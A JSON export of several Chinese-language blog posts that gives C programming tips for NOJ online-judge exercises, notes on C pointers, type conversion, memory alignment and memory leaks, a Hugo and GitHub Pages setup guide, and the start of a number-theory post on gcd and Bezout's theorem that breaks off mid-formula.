[{"content":"主要给出了WA时可能会出现的错误, 节省调试时间, 并方便日后回顾; 建议提交一次后对照查询, 其他问题请本地调试解决.\n由于从11题开始题目顺序会打乱, 故给出题目名称, 请按题目名称查找.\nHello World 略.\nA+B 略.\n数据类型大小及范围 可使用switch-case进行条件判断.\n使用CHAR_MAX等宏时, 注意包含头文件\u0026lt;limits.h\u0026gt;.\n平均值 直接相加可能会越界.\n1 int avg = ((a-b)\u0026gt;\u0026gt;1)+b; 进制转换 输出大写十六进制需使用\u0026quot;%X\u0026quot;, \u0026ldquo;%x\u0026quot;会输出小写十六进制.\n浮点数输出 略.\n动态宽度输出 可使用\u0026quot;tmp/10\u0026quot;做十进制向右移位获取输入数字长度.\n1 2 3 4 5 6 cnt = 0, tmp = n; while(tmp){ tmp /= 10; ++cnt; } if (!n) cnt = 1; 计算地球上两点之间的距离 C中三角函数仅接收弧度参数, 需先将经纬度转换为弧度.\n1 2 #define Pi 3.1415926 phi1 = phi1*PI/180; 风寒指数 输出要求四舍五入, 只做类型转换是截断.\n1 int chillInt = (int)(chillDouble+0.5f); 颜色模型转换 取最大值和最小值, 可使用比较运算符.\n1 2 int max = r \u0026gt;= g ? (r \u0026gt;= b ? r : b) : (r \u0026gt;= b ? r : b); int min = r \u0026lt;= g ? (r \u0026lt;= b ? r : b) : (r \u0026lt;= b ? r : b); 如果使用浮点型比较, 浮点数不精确, 不能直接使用\u0026quot;a == b\u0026rdquo;, 应当使用\u0026quot;a-b \u0026lt; 1e-9\u0026quot;.\n如果使用整型比较, 计算时应当进行类型转换(强制或隐式), 否则\u0026quot;/\u0026ldquo;左右操作数均为整数时只能得到整数.\n此外, 每个除数都应当判断不为0.\n乘数模 直接相乘可能会越界, 先取模再相乘再取模.\n1 r = ((a%m)*(b%m))%m; 方阵 可使用比较运算符得到矩阵元素. 无需使用数组.\n1 a = (col-raw) ? (col-raw) : (raw-col); // a[col][raw] 分数的加、减、乘、除法 可使用\u0026quot;getchar();\u0026ldquo;取走输入中的\u0026rdquo;/\u0026rdquo;.\n约分时, 可使用辗转相除法得到分子分母最大公因数, 再分别除掉.\n1 2 3 4 int gcd(int a,int b){ if (b == 0) return a; else return gcd(b,a%b); } 结果中若出现负分数, 只需保证最大公因数为正即可.\n1 2 int d = gcd(m,n); d = d \u0026gt; 0 ? d : -d; 操作数 同“动态宽度输出”, \u0026ldquo;%10\u0026quot;可以得到个位数, \u0026ldquo;/10\u0026quot;可以十进制下向右移动一位.\n组合数 暴搜, 不会超时.\n比率 \u0026ldquo;*10\u0026quot;实现十进制下向左移动一位, 直到变成整数, 判断不是整数可使用\u0026quot;x != floor(x)\u0026rdquo;.\n得到最大公因数并约分, 同\u0026quot;分数的加、减、乘、除法\u0026rdquo;.\n级数和 \u0026ldquo;/10\u0026quot;实现十进制下右移一位, 直到没有整数部分, 判断有整数部分可使用\u0026rdquo;(int)x\u0026rdquo;.\n舍去末尾的0, 可使用\u0026quot;%g\u0026quot;格式化输出.\n对称数 \u0026ldquo;fget(num,11,stdin)\u0026ldquo;获取数字为字符串, 并替换掉末尾换行符.\n1 2 char *find = strchr(num,\u0026#39;\\n\u0026#39;); // strchr()在头文件\u0026lt;string.h\u0026gt;中 if(find) *find = \u0026#39;\\0\u0026#39;; 使用\u0026quot;strlen()\u0026ldquo;获取长度, 也需引入头文件\u0026lt;string.h\u0026gt;.\n翻转分为数字改变和位置改变. 数字(实则为字符)改变为: \u0026lsquo;6\u0026rsquo;-\u0026gt;\u0026lsquo;9\u0026rsquo;, \u0026lsquo;9\u0026rsquo;-\u0026gt;\u0026lsquo;6\u0026rsquo;, \u0026lsquo;0\u0026rsquo;-\u0026gt;\u0026lsquo;0\u0026rsquo;, \u0026lsquo;1\u0026rsquo;-\u0026gt;\u0026lsquo;1\u0026rsquo;, \u0026lsquo;8\u0026rsquo;-\u0026gt;\u0026lsquo;8\u0026rsquo;. 位置改变为第i位换到第(len-i-1)位.\n可使用switch-case翻转后再逐位判断, 或直接判断; 包含其他数字时(default)则直接输出\u0026quot;No\u0026rdquo;.\n偷分寄巧: 由于该题样例只有三位数, 可直接暴力判断\n1 2 3 4 5 6 7 8 9 10 int a = (n/100)%10; int b = (n/10)%10; int c = n%10; if ((b == 0 || b == 1 || b == 8) \u0026amp;\u0026amp; ((a == 6 \u0026amp;\u0026amp; c == 9) || (a == 9 \u0026amp;\u0026amp; c == 6) || ((a == 0 || a == 1 || a == 8) \u0026amp;\u0026amp; (c == 0 || c == 1 || c == 8)))){ printf(\u0026#34;Yes\\n\u0026#34;); } else { printf(\u0026#34;No\\n\u0026#34;); } 幂数模 直接求幂再求模可能会越界超时, 须使用快速模幂.\n$b=2k$ 时, 有 $a^b\\equiv(a^k)^2 ({\\rm mod}\\ m)$; $b=2k+1$ 时, 有 $a^b\\equiv(a^k)^2\\times a ({\\rm mod}\\ m)$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 typedef unsigned long long uint64; uint64 fastPowerMod (uint64 t, uint64 e, uint64 m){ uint64 r = 1; while (e){ if (e\u0026amp;1){ r = (r*t)%m; } t = (t*t)%m; e \u0026gt;\u0026gt;= 1; } return r; } 倍数和 输入采用动态数组或足够大的数组或直接循环均可.\n1 2 3 4 5 6 7 8 unsigned int t; scanf(\u0026#34;%u\u0026#34;,\u0026amp;t); // 以下四种方法任选其一 unsigned int n[t]; // 1. MSVC会报错, 但GCC支持, 可以AC unsigned int *n = (unsigned int *)malloc(t*sizeof(unsigned int)); // 2. MSVC和GCC均支持, 但需引入头文件\u0026lt;malloc.h\u0026gt; unsigned int n[100000] // 3. 足够大的数组, 不会溢出, 不会超出内存限制 for (unsigned int i = 1; i \u0026lt;= t; ++i); // 4. 循环读取输入并输出 暴搜, 不会超时.\n余数和 输入顺序.\n最大数字 条件为小于或等于 $n$.\n倒水 使用BFS(广度优先), 将水杯状态视为顶点, 状态间的转移即为边, 每次转移相对(初始状态)距离加1; $(0,0)$为初始状态, 检索到 $(0,d)$ 或 $(d,0)$ 时终止, 此时距离矩阵中对应元素值即为最小操作次数.\n1 2 3 4 5 6 #include \u0026lt;string.h\u0026gt; #define INF 0x3f3f3f3f // 无穷大, 表示未检索 int distTable[10000][10000]; // 距离矩阵 memset(distTable, 0x3f, sizeof(distTable)); // 初始化 distTable[0][0] = 0; // 设置初始状态 每次状态转移共有八种情况: (记左为0, 右为1)\n装满0: $(a,b)\\to (n,b)$; 装满1: $(a,b)\\to (a,m)$; 倒空0: $(a,b)\\to (0,b)$; 倒空1: $(a,b)\\to (a,0)$; 0倒入1, 1未满: $(a,b)\\to (0,a+b)$, $a+b\u0026lt;m$; 0倒入1, 1已满: $(a,b)\\to (a+b-m,m)$, $a+b\\geq m$; 1倒入0, 0未满: $(a,b)\\to (a+b,0)$, $a+b\u0026lt;n$; 1倒入0, 0已满: $(a,b)\\to (n,a+b-n)$, $a+b\\geq n$. 使用数组表示循环队列, 当前状态为队首, 转移后插入至队尾.\n1 2 3 4 5 6 7 8 9 #define MAXSIZE 10000 int queue[MAXSIZE][2] = {0}; // 循环队列并初始化 int head = 0; // 队首指向0 int tail = 1; // 队尾指向1 // 移动队首队尾时用取余实现循环效果 head = (head+1)%MAXSIZE tail = (tail+1)%MAXSIZE 好数字 同幂数模.\n$$\\frac{n+1}{2} = \\begin{cases} k, \\ n=2k \\\\ k+1, \\ n=2k+1 \\\\ \\end{cases}$$\n毕达哥拉斯三元组 不妨设 $a$ 为短直角边, $b$ 为长直角边; 则 $a\\in (0,\\frac{n}{4})$, $b\\in [a,\\frac{n}{2})$.\n另须判断 $a,b,c$ 构成三角形: $a+b\u0026gt;c$.\n竖式乘法 \u0026ldquo;/10\u0026quot;获取位数\u0026quot;len(num)\u0026rdquo;.\n获取右数第 $n$ 位数字.\n1 2 3 4 #include \u0026lt;math.h\u0026gt; x /= (uint)pow(10,n-1); x %= 10; 总宽度为\u0026quot;lenTotal = len(ans)+1;\u0026rdquo;, 加算中第 $i$ 列空格数为 \u0026ldquo;j \u0026lt;= lenTotal-len(current)-(i-1);\u0026rdquo; 亦即 \u0026ldquo;j \u0026lt; lenTotal-len(current)-i\u0026rdquo;.\n查找数列 写成下三角形式, 第 $n$ 列末尾项数为 $1+2+\u0026hellip;+n$.\n1 2 3 4 5 6 7 cnt = 1, sum = 0; while(n-sum \u0026gt; 0){ sum += cnt; ++cnt; } sum -= cnt; ans = n-sum == 0 ? cnt : (n-sum-1); 俄罗斯农夫乘法 在循环输出中判断并累加即可.\n阶乘倍数 枚举阶乘模可能会超时, 可以改为对 $k$ 因子分解后二分查找.\n可以使用两个数组记录因子分解情况再二分查找, 也可以在二分查找过程中不断分解 $k$.\n正整数均有唯一分解形式: $k=\\prod p_i^{\\alpha_i}$, $p_i$ 为素数.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 typedef long long int64; int64 pFactNum = 0; // 素因子个数 int64 prime[20] = {0}, exponent[20] = {0}; // 前19个素数相乘已经非常大了 for (int64 i = 2; i*i \u0026lt;=k; ++i){ if (k%i == 0){ prime[++pFactNum] = i; while (k%i == 0){ ++exponent[pFactNum]; k /= i; } } } // 无法分解, 说明k为素数 if (k\u0026gt;1) { prime[++pFactNum] = k; ++exponent[pFactNum]; } 匹配时, $n!$ 中含有素因子个数应当超过 $k$ 中对应素因子的指数.\n1 2 3 4 5 int64 primeNum = 0, tmp = n; while(tmp) { primeNum += tmp/prime[i]; // n!中含有k的第i个素因子的个数 tmp /= prime[i]; } 二分查找时, 中间值满足条件说明在左区间, 不满足则在右区间; 可以使用开区间或闭区间, 但均须保证不重不漏, 并避免死循环.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int64 left = 1, right = 1e19, mid, ans; // 闭区间 while (left \u0026lt;= right){ mid = ((right-left)\u0026gt;\u0026gt;1)+left; if (1){ right = mid-1; ans = mid; } else { left = mid+1; } } // 开区间 while (left+1 \u0026lt; right){ mid = ((right-left)\u0026gt;\u0026gt;1)+left; if (1){ right = mid; ans = mid; } else { left = mid; } } 方案数 枚举首项可能会超时, 可以改为枚举项数.\n不妨设存在时, 首项为 $a$, 项数为 $m$, 有 $\\frac{m(2a+m-1)}{2}=n$, 即 $a=\\frac{n-m(m-1)/2}{m}\\geq 1$. 故存在时有 $m|n-m(m-1)/2$ 和 $m\u0026lt;\\sqrt{2n}$.\n","date":"2023-09-19T00:00:00Z","permalink":"https://example.com/p/nojc%E6%98%93%E9%94%99%E6%80%BB%E7%BB%93/","title":"NOJ(C)易错总结"},{"content":"标准默认C11, 编译器默认GCC8.1.0及MSVC1937. 内容不分先后顺序, 请按需查阅.\nCMAKE 使用CLion或VS时, 可以考虑如下CMAKE配置; 会自动获取项目名与文件名, 每次修改项目名文件名或新建文件时, 只需重新加载CMAKE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 cmake_minimum_required(VERSION 3.26) get_filename_component(ProjectId ${CMAKE_CURRENT_SOURCE_DIR} NAME) string(REPLACE \u0026#34; \u0026#34; \u0026#34;_\u0026#34; ProjectId ${ProjectId}) project(${ProjectId} C) set(CMAKE_C_STANDARD 11) file(GLOB files \u0026#34;${CMAKE_CURRENT_SOURCE_DIR}/*.c\u0026#34;) foreach(file ${files}) get_filename_component(name ${file} NAME) add_executable(${name} ${file}) endforeach() 添加头文件:\n1 include_directories(\u0026#34;头文件相对路径\u0026#34;) 此外, 还可以修改C标准版本:\n1 set(CMAKE_C_STANDARD 99) 一个方便调试的头文件 该头文件中定义用变长参数定义了一系列输出函数, 可以直接采用\u0026quot;PRINT_TYPE(variable);\u0026ldquo;的形式来打印对应类型的变量并换行. 传入数组时, 传入的是数组的首位指针, 还需在外部获取数组长度一并传入.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #ifndef BASICC_IO_UTILS_IO_UTILS_H_ #define BASICC_IO_UTILS_IO_UTILS_H_ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;limits.h\u0026gt; void PrintBinary(unsigned int value); //#define PRINT_METADATA #ifdef PRINT_METADATA # define PRINTLNF(format, ...) printf(\u0026#34;(\u0026#34;__FILE__\u0026#34;:%d) %s: \u0026#34;format\u0026#34;\\n\u0026#34;, __LINE__, __FUNCTION__ , ##__VA_ARGS__) #else # define PRINTLNF(format, ...) printf(format\u0026#34;\\n\u0026#34;, ##__VA_ARGS__) #endif #define PRINT_CHAR(char_value) PRINTLNF(#char_value\u0026#34;: %c\u0026#34;, char_value) #define PRINT_WCHAR(char_value) PRINTLNF(#char_value\u0026#34;: %lc\u0026#34;, char_value) #define PRINT_INT(int_value) PRINTLNF(#int_value\u0026#34;: %d\u0026#34;, int_value) #define PRINT_LONG(long_value) PRINTLNF(#long_value\u0026#34;: %ld\u0026#34;, long_value) #define PRINT_LLONG(long_value) PRINTLNF(#long_value\u0026#34;: %lld\u0026#34;, long_value) #define PRINT_BINARY(int_value) PrintBinary((unsigned int) int_value); #define PRINT_HEX(int_value) PRINTLNF(#int_value\u0026#34;: %#x\u0026#34;, int_value) #define PRINT_BOOL(bool_value) PRINTLNF(#bool_value\u0026#34;: %s\u0026#34;, bool_value ? \u0026#34;true\u0026#34; : \u0026#34;false\u0026#34;) #define PRINT_DOUBLE(double_value) PRINTLNF(#double_value\u0026#34;: %g\u0026#34;, double_value) #define PRINT_STRING(string_value) PRINTLNF(#string_value\u0026#34;: %s\u0026#34;, string_value) #define PRINT_ARRAY(format, array, length) \\ { int array_index; \\ for (array_index = 0; array_index \u0026lt; length; ++array_index) { \\ printf(format, array[array_index]); \\ };\\ printf(\u0026#34;\\n\u0026#34;); } #define PRINT_INT_ARRAY_LN(array, length) \\ { int i; \\ for (i = 0; i \u0026lt; length; ++i) { \\ PRINTLNF(#array\u0026#34;[%d]: %d\u0026#34;, i, array[i]); \\ }} #define PRINT_INT_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%d, \u0026#34;, array, length) #define PRINT_CHAR_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%c, \u0026#34;, array, length) #define PRINT_DOUBLE_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%g, \u0026#34;, array, length) #endif //BASICC_IO_UTILS_IO_UTILS_H_ 来自: https://www.bennyhuo.com/\n赋值语句 在赋值语句中, 左值(\u0026quot;=\u0026ldquo;左边)必须是一个变量或说内存, 不能为数值; 右值(\u0026quot;=\u0026ldquo;右边)一定为数值.\n1 2 3 4 5 int *p = \u0026amp;a; *p = 2; // 合法 *(p+1) = 3; // 合法 \u0026amp;a = p; // 非法, \u0026amp;a为变量a的地址, 是数值 *p+1 = 4; // 非法, *p解引用, *p+1为p指向的内存中的数据+1, 是数值 1 2 3 4 5 int array[] = {0,1,2,3}; int *p = array; *p = 10; // 合法 *p++ = 20; // 合法 *++p = 30; // 合法 不同数据类型的运算 整型提升: 表达式中存在(unsigned) int, 则 (unsigned) char, (unsigned) short int, enum 均转换为int, 不足时转换为 unsigned int.\n1 2 3 4 5 6 7 8 9 10 #include\u0026lt;stdio.h\u0026gt; int main(){ char ch = \u0026#39;a\u0026#39;; short st = 4; int i = 0; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ch+st),sizeof(i)); return 0; } 隐式转换: 算术表达式: 低类型转换为高类型, int -\u0026gt; unsigned int -\u0026gt; long -\u0026gt; unsigned long -\u0026gt; long long -\u0026gt; unsigned long long -\u0026gt; float -\u0026gt; double -\u0026gt; long double; 赋值表达式: 右值转换为左值; 函数传参: 实参转换为形参; 函数返回值: 表达式转换为返回值. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include\u0026lt;stdio.h\u0026gt; int main(){ int i = 0; unsigned int ui = 0; long l = 1; long long ll = 2; float f = 0.1f; double d = 0.2f; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(i+l),sizeof(l)); printf(\u0026#34;%llu %llu %llu \\n\u0026#34;,sizeof(l+ll),sizeof(ui+ll),sizeof(ll)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ll*f),sizeof(f)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(f+d),sizeof(d)); short s = d*ll; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(s)); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 #include\u0026lt;stdio.h\u0026gt; double func(int a){ printf(\u0026#34;%llu\\n\u0026#34;,sizeof(a)); return a; } int main(){ double a = 2.9f; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(func(a))); printf(\u0026#34;%f\u0026#34;, func(a)); return 0; } 强制类型转换: (类型名) 表达式\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 17, b = 5; double c = a/b; double d = (double)a/b; printf(\u0026#34;%f %f\u0026#34;,c,d); return 0; } 应用: 模平方时防止越界\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 104560; int m = 1307; int b = (a*a)%m; int c = (1LL*a*a)%m; int d = ((long long)a*a)%m; printf(\u0026#34;%d %d %d\u0026#34;,b,c,d); return 0; } 内存对齐 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; char ch; int i; short s; double d; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); printf(\u0026#34;%llu\\n\u0026#34;, sizeof(ch)+ sizeof(ch)+ sizeof(i)+ sizeof(s)+ sizeof(d)); return 0; } 发现结构体内部变量占用空间加起来仅为16个字节, 但结构体占用24个字节, 这就涉及到结构体的内存对齐.\nchar占用1字节, 对齐到1的倍数; int占用4字节, 对齐到4的倍数; double占用8字节, 对齐到8的倍数. 尽管内存以字节为基本单位, 但CPU会以4字节, 8字节, 甚至16字节进行访问; 在没有对齐机制时, 访问到正确的变量位置需要额外操作. 内存对齐系数由编译器决定, 结构体占用内存为对齐系数倍数. GCC和MSVC中默认对齐系数均为4, 可以通过预编译\u0026rdquo;#pragma pack(n)\u0026ldquo;来改变.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; #pragma pack(2) int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 但通常不建议改变对齐系数, 为了使结构体占用更小内存, 应当将占用较小的变量统一排在前面, 如将上述结构体修改为:\n1 2 3 4 5 6 7 8 9 10 11 int main(){ typedef struct { char sch1; char sch2; short ss; int si; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 动态数组 有时在声明数组时无法确定数组长度, 需要传入参数.\n1 2 3 4 5 6 7 #include \u0026lt;stdio.h\u0026gt; int main(){ int n = 3; int a[n]; return 0; } GCC可以编译通过; 但MSVC不支持变长数组, 会报错. 可以考虑用内存分配函数实现, 调用方式同数组.\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; int main(){ int n = 3; int *a = (int*)malloc(n*sizeof(int)); a[0] = 1; printf(\u0026#34;%d\u0026#34;,a[0]); free(a); a = NULL; return 0; } 深入理解指针 声明变量时, 如\u0026quot;int a;\u0026rdquo;, 在运行时会为变量a开辟一块内存空间, 但值不能确定. 用scanf写入时, 用\u0026rdquo;\u0026amp;a\u0026quot;表示写入到变量a所在的地址. 地址的数据类型即为指针类型, 即指针类型的变量存放的数据为内存地址.\n数据类型包含两个信息: 内存占用大小; 读写时遵循的规则. 定义一个指针类型时, 还需要给出指向的数据类型. 这是因为指针仅指向一个内存单元, 也就是CPU读写的起始位置(小端序下的数据低位); 只有给出指向的数据类型, CPU才能知道读写的终止位置和读写遵循的规则.\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main(){ long long a = 0x0A0B0C0D; long long* p1 = \u0026amp;a; int* p2 = \u0026amp;a; // 在本行打断点调试, 在CLion或VS的Memory View中输入\u0026amp;a查看内存位置, 并对比Threads \u0026amp; Variables中p1,p2的值 return 0; } 此外, 指针类型的占用空间取决于CPU寻址方式, 与指向的数据类型无关.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main(){ char a; short b; int c; double d; char *pa = \u0026amp;a; short *pb = \u0026amp;b; int *pc = \u0026amp;c; double *pd = \u0026amp;d; printf(\u0026#34;%llu %llu %llu %llu\u0026#34;,sizeof(pa),sizeof(pb),sizeof(pc),sizeof(pd)); return 0; } 无歧义地, 指针类型和指针类型变量均简称为指针.\n1 2 3 4 // 指针存放的是地址, 以下显然是合法的. int a; int *p = \u0026amp;a; scanf(\u0026#34;%d\u0026#34;,p); 显然\u0026quot;int **p\u0026quot;意为指向\u0026quot;int *\u0026ldquo;类型的指针, \u0026ldquo;int ***p\u0026quot;意为指向\u0026quot;int **\u0026ldquo;类型的指针. \u0026ldquo;*p\u0026quot;含义为解引用, 即读写指针p指向的内存.\n在使用指针时, 应当避免出现野指针, 即指向非法内存的指针.\n1 2 3 // 使用未初始化的指针 int *p; printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 // 释放指针后未置空 int *p = (int*)malloc(sizeof(int)); free(p); printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 5 6 7 8 9 // 指向对象已消亡(超出变量作用域) int *Address(void){ int a = 10; return \u0026amp;a; } void getAddress(void){ int *p = Address(); printf(\u0026#34;%d\u0026#34;,*p); } 1 2 3 4 5 // 指针赋值为无法读取的内存 int *p = (int *) 0x100000; printf(\u0026#34;%d\u0026#34;,*p); // Windows进程内存空间地址从0x400000开始 // 但考虑到平台不同时进程起始位置不同, 通常不建议赋值为具体地址 指针也可以进行加减运算, 含义为指向前后的内存, 移动单位取决于指向的数据类型.\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; int main(){ double a = 0.0f; double *p = \u0026amp;a; printf(\u0026#34;%u %u %u %llu\u0026#34;,p-1,p,p+1,sizeof(a)); return 0; } 数组是连续的内存, 由此想到可以通过数组指针来调用数组, 同时数组变量名本质上也是指针.\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main(){ int array[] = {0,1,2,3}; int *p = array; printf(\u0026#34;%d %d %d %d %d\u0026#34;,array[2],p[2],*(p+2),*(array+2),2[array]); return 0; } // 考虑到可读性, 仅推荐array[2]和p[2]两种调用方式. 指针自然也可以作为函数参数. 调用函数赋值时, 如\u0026quot;int a = func(b);\u0026rdquo;, CPU将函数返回值复制到寄存器中, 再将寄存器中的数据复制到要改变的变量, 这一过程也就体现为变量的作用域. C可以返回结构体, 同时无法直接返回数组, 不使用指针时可以将数组包含在结构体中; 而若直接返回结构体, 结构体由于本身占用较大, 复制两次导致性能开销过大. 此时, 可以在函数外声明结构体或数组, 并将指向结构体的指针或数组传入.\n函数也存在地址, 自然也可以有指向函数的指针. 但声明函数指针时, 运算优先级问题往往让人感到困惑: 如参数列表\u0026rdquo;()\u0026ldquo;的优先级高于\u0026rdquo;*\u0026rdquo;. 在分析函数声明时, 可以借助网站: https://cdecl.org/.\n字符串长度 C中字符串应以\u0026quot;NULL\u0026rdquo;(或\u0026rdquo;\\0\u0026quot;或0)结尾, 字符串的长度应当包含结尾的\u0026quot;NULL\u0026quot;, 但使用\u0026lt;string.h\u0026gt;库中的\u0026quot;strlen()\u0026ldquo;函数时, 返回的是字符串的有效长度: 如在第n-1位遇到NULL, 则返回n.\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(){ char a[20] = \u0026#34;string\u0026#34;; printf(\u0026#34;%llu\u0026#34;,strlen(a)); return 0; } 字符串和数组一样有多种声明方式. 以长度声明字符串时, 需注意留一位给末尾的\u0026quot;NULL\u0026rdquo;. 动态长度字符串同数组, 同时使用\u0026quot;memset()\u0026ldquo;函数初始化. 若用\u0026quot;strlen()\u0026ldquo;得到其他字符串输出时, 想要得到相同有效长度的字符串需要声明长度为\u0026quot;strlen(string)+1\u0026rdquo;. 尽管不以\u0026quot;NULL\u0026quot;结尾有时不会得到错误的输出, 但应当避免不规范的使用. 仅以字符串值声明字符串时, 编译器会默认在结尾添加\u0026quot;NULL\u0026rdquo;, 无论字符串值末尾是否有\u0026quot;\\0\u0026quot;.\n1 2 3 4 5 int main(){ char str[] = \u0026#34;C is the best language!\\0\u0026#34;; // 此处打断点调试, 发现字符串长度为25, 但有效字符只有23个, 最后两个均为\u0026#34;NULL\u0026#34;. return 0; } 逻辑短路 对于逻辑运算符与\u0026quot;\u0026amp;\u0026amp;\u0026ldquo;和或\u0026rdquo;||\u0026ldquo;存在短路规则, \u0026ldquo;\u0026amp;\u0026amp;\u0026ldquo;前若已为假则忽略后续直接返回\u0026quot;fasle\u0026rdquo;, 同理\u0026rdquo;||\u0026ldquo;前若已为真则忽略后续直接返回\u0026quot;true\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 0, b = 1, c = 10, f, t; f = a \u0026amp;\u0026amp; (b - ++c); t = b || (a - c++); printf(\u0026#34;%d\\n\u0026#34;,c); f = b \u0026amp;\u0026amp; (a - ++c); t = a || (b - c++); printf(\u0026#34;%d\\n\u0026#34;,c); return 0; } 运算优先级上, \u0026ldquo;()\u0026ldquo;和\u0026rdquo;++\u0026ldquo;都高于\u0026rdquo;\u0026amp;\u0026amp;\u0026ldquo;和\u0026rdquo;||\u0026rdquo;, 但第一次f和t赋值中有副作用的\u0026rdquo;++\u0026ldquo;一次也没有被执行, 第二次中都被执行了.\n内存溢出和内存泄漏 内存溢出指申请空间没有足够的空间可以使用, 如声明\u0026quot;int\u0026quot;类型变量, 但赋值了超出\u0026quot;int\u0026quot;类型的数.\n内存泄漏指申请使用内存后, 无法释放已经申请的内存空间; 内存泄漏累积就会造成内存溢出. (在某些优化较差的游戏中, 如刺客信条: 大革命, 游玩时会突然卡死, 打开任务管理器发现内存占用率100%, 可能就是遇到了内存泄漏问题.) 对于个人用户, 内存泄漏也许不严重, 结束程序进程时会释放所有已分配的内存; 但对于服务器, 某些程序需要一直保持运行, 内存泄漏会不断累积并造成严重后果.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 比较低级的错误: 分配的内存使用完后没有释放 // 指针重新赋值时, 原指向位置丢失 int *p = (int *)malloc(sizeof(int)); int *np = (int *)malloc(sizeof(int)); p = np; // 内存释放时, 造成位置孤立 head -\u0026gt; next = node; free(head); // 分配了没有指针指向的内存 int *memory(){ return (int *)malloc(sizeof(int)); } void lost(){ memory(); } 防止内存泄漏的核心思想是: 进行任何内存有关的操作时, 始终确保每个已分配的内存都有指针指向.\n待更新内容: 聚合体与字节序, 副作用, 按位运算妙用, 宏函数, 变长参数, 线程\n","date":"2023-09-16T00:00:00Z","permalink":"https://example.com/p/c%E6%9D%82%E8%B0%88/","title":"C杂谈"},{"content":"PREPARATION git download hugo download Check git \u0026amp; hugo added in the environment variables (Windows).\nThe following steps are in Bash.\n1 2 git version hugo version ON PREMISES 1 2 3 4 5 6 hugo new site blog cd blog git clone https://themeName themes/themeName cp themes/themeName/exampleSite/* ./ -r rm hugo.toml hugo server FIRST COMMIT Github Create Repositoriy: username.github.io\n1 2 3 4 5 6 7 hugo cd public git init git remote add origin https://github.com/username/username.github.io.git git add . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master LATER COMMIT 1 2 3 4 5 6 hugo cd public git add . git status git commit -m \u0026#34;add blog post\u0026#34; git push KATEX CONFUSION display obsidian hugo newline \\\\ \\\\\\ % \\% \\\\% suffix { }_ { }\\_ * * \\* ","date":"2023-09-14T00:00:00Z","permalink":"https://example.com/p/hugo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"hugo快速入门"},{"content":"文中所有C代码均编译通过并得到正确结果! (C11 - GCC8.1.0)\n整除 性质: $c|a$, $c|b \\Longrightarrow$ $c|ax+by$, $\\forall x,y\\in\\mathbb{Z}$. 最大公因数: ${\\rm gcd}(a,b)=\\inf_{\\geq 0}{sa+tb|s,t\\in\\mathbb{Z}}$.\n辗转相除求${\\rm gcd}$: $$\\begin{align} \u0026amp;a=q_1b+r_1\\\\ \u0026amp;b=q_2r_1+r_2\\\\ \u0026amp;\u0026hellip;\\\\ \u0026amp;r_{n-2}=q_nr_{n-1}+r_n \\end{align}$$ 当 $r_n=0$ 时, 有 $r_{n-1}={\\rm gcd}(a,b)$.\n对序列中被除数与除数从$1$开始编号, 进而有递归: $$\\begin{align} \u0026amp;a_i=(a_i/b_i)b_i+(a_i\\%b_i)\\\\ \u0026amp;a_i=b_{i-1}\\\\ \u0026amp;b_i=a_{i-1}\\%b_{i-1} \\end{align}$$ 并约定 ${\\rm gcd}(a,0)=a$.\n1 2 3 int Euclid(int a, int b){ return b==0? a : Euclid(b,a%b); } Bezout定理: 给定 $a,b\\in\\mathbb{Z}$, Diophantine方程 $ax+by=m$ 有解 $\\Longleftrightarrow$ ${\\rm gcd}(a,b)|m$.\n可仅考查 $m={\\rm gcd}(a,b)$, 不然, 结果只需乘相应倍数. 在递归中, 显然有 ${\\rm gcd}(a,b)={\\rm gcd}(a_i,b_i)$, 即 $\\exists x_i,y_i\\in\\mathbb{Z}$ s.t. $a_ix_i+b_iy_i=m$. $$\\begin{align} m\u0026amp;=a_ix_i+b_iy_i\\\\ 